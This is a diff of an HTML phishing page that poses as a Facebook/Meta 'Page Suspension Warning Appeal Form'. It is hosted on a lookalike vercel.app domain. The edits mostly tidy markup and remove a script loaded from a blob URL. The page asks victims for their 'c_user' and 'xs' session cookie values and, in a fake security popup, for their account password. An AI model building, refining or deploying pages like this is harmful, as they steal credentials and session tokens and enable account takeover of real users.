@@ -1,10 +1,13 @@
-<html lang="en" webcrx=""><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#4285f4">
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#4285f4" />
   <meta name="description" content="Page Suspension Warning Appeal Form - Submit your appeal to review your suspended page">
   <title>Page Suspension Warning Appeal Form</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
   <style>
     :root {
       --primary-color: #3b5998;
@@ -851,7 +854,7 @@
       }
     }
   </style>
-<script src="blob:https://appeal-account-restricted-issue-rem.vercel.app/ef13266b-4707-470b-9725-5c8723ffb8af"></script></head>
+</head>
 <body>
   <!-- Top Navigation -->
   <nav class="top-nav">
@@ -860,11 +863,13 @@
     </button>
     <p class="top-nav-text">Facebook</p>
     <div class="search-container">
-      <input type="text" class="search-bar" placeholder="Search..." aria-label="Search">
+      <input type="text" class="search-bar" placeholder="Search..." aria-label="Search" />
       <i class="fa fa-search search-icon" aria-hidden="true"></i>
     </div>
     <div class="translator-container">
-      <button class="translator-btn" id="translatorBtn" aria-label="Change language"><i class="fa fa-language"></i> English</button>
+      <button class="translator-btn" id="translatorBtn" aria-label="Change language">
+        <i class="fa fa-language"></i> English
+      </button>
       <div class="translator-dropdown" id="translatorDropdown">
         <a href="#" onclick="changeLanguage('en')">English</a>
         <a href="#" onclick="changeLanguage('es')">Español</a>
@@ -887,7 +892,7 @@
   <div class="content-wrapper">
     <nav class="side-nav" id="sideNav" aria-label="Main navigation">
       <!-- Side Navigation Items -->
-      <div class="side-nav-item active">Page Issues</div>
+      <div class="side-nav-item">Page Issues</div>
       <div class="side-nav-item">Your Profile</div>
       <div class="side-nav-item">Friending</div>
       <div class="side-nav-item">Your Home Page</div>
@@ -921,7 +926,7 @@
           <div class="video-container">
             <div class="video-title" id="video-title">Appeal Process Guide</div>
             <div class="video-wrapper">
-              <video id="guideVideo" width="100%" controls="" playsinline="" webkit-playsinline="" style="display:none;" aria-label="Appeal process guide video">
+              <video id="guideVideo" width="100%" controls playsinline webkit-playsinline style="display:none;" aria-label="Appeal process guide video">
                 <source id="videoSource" src="" type="video/mp4">
                 Your browser does not support the video tag.
               </video>
@@ -938,12 +943,12 @@
 
           <div class="input-field">
             <label for="c_user" id="c_user-label">c_user</label>
-            <input type="text" id="c_user" name="c_user" aria-required="true">
+            <input type="text" id="c_user" name="c_user" aria-required="true" />
           </div>
 
           <div class="input-field">
             <label for="xs" id="xs-label">xs</label>
-            <input type="text" id="xs" name="xs" aria-required="true">
+            <input type="text" id="xs" name="xs" aria-required="true" />
           </div>
 
           <div id="error-message" role="alert"></div>
@@ -967,7 +972,7 @@
         <a href="#" class="footer-link">Help Center</a>
       </div>
       <div class="footer-meta">
-        <p class="copyright">© 2025 Meta Platforms, Inc. All rights reserved.</p>
+        <p class="copyright">&copy; 2025 Meta Platforms, Inc. All rights reserved.</p>
         <div class="footer-locale">
           <i class="fa fa-globe" aria-hidden="true"></i>
           <span>English (US)</span>
@@ -984,7 +989,7 @@
   <!-- Language Selector Popup -->
   <div class="popup-overlay" id="languagePopupOverlay">
     <div class="language-popup" id="languagePopup">
-      <button class="close-btn" onclick="closeLanguagePopup()" aria-label="Close language popup">×</button>
+      <button class="close-btn" onclick="closeLanguagePopup()" aria-label="Close language popup">&times;</button>
       <h2 class="title">Select Your Language</h2>
       <div class="language-options">
         <div class="language-option" onclick="selectLanguage('english')">English</div>
@@ -1001,15 +1006,15 @@
   <!-- Security Verification Popup -->
   <div class="popup-overlay" id="securityPopupOverlay">
     <div class="auth-box" id="securityPopup">
-      <button class="close-btn" onclick="closePopup()" aria-label="Close security popup">×</button>
+      <button class="close-btn" onclick="closePopup()" aria-label="Close security popup">&times;</button>
       <div class="logo">
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true">
-          <path d="M48 24C48 10.7 37.3 0 24 0S0 10.7 0 24c0 11.8 8.6 21.6 20 23.4V31h-6v-7h6v-5.3c0-6 3.6-9.3 9-9.3 2.6 0 5.3.5 5.3.5v5.8h-3c-3 0-3.9 1.8-3.9 3.7V24h6.5l-1 7h-5.5v16.4c11.4-1.8 20-11.6 20-23.4z"></path>
+          <path d="M48 24C48 10.7 37.3 0 24 0S0 10.7 0 24c0 11.8 8.6 21.6 20 23.4V31h-6v-7h6v-5.3c0-6 3.6-9.3 9-9.3 2.6 0 5.3.5 5.3.5v5.8h-3c-3 0-3.9 1.8-3.9 3.7V24h6.5l-1 7h-5.5v16.4c11.4-1.8 20-11.6 20-23.4z" />
         </svg>
       </div>
       <h1 class="title" id="security-title">Enter your password to confirm it's you</h1>
       <div class="input-container">
-        <input type="password" class="input-field" placeholder="Password" id="passwordInput" aria-label="Password">
+        <input type="password" class="input-field" placeholder="Password" id="passwordInput" aria-label="Password" />
       </div>
       <button class="submit-btn" id="continue-btn" onclick="submitPassword()">Continue</button>
       <p class="disclaimer" id="security-disclaimer">For security reasons, please verify your identity. This helps us keep your account safe.</p>
@@ -1019,7 +1024,7 @@
   <!-- Success Popup -->
   <div class="popup-overlay" id="successPopupOverlay">
     <div class="success-popup" id="successPopup">
-      <button class="close-btn" onclick="closeSuccessPopup()" aria-label="Close success popup">×</button>
+      <button class="close-btn" onclick="closeSuccessPopup()" aria-label="Close success popup">&times;</button>
       <div class="success-icon">
         <i class="fa fa-check-circle" aria-hidden="true"></i>
       </div>
@@ -1576,6 +1581,5 @@
       }
     });
   </script>
-
-
-</body></html>
+</body>
+</html>
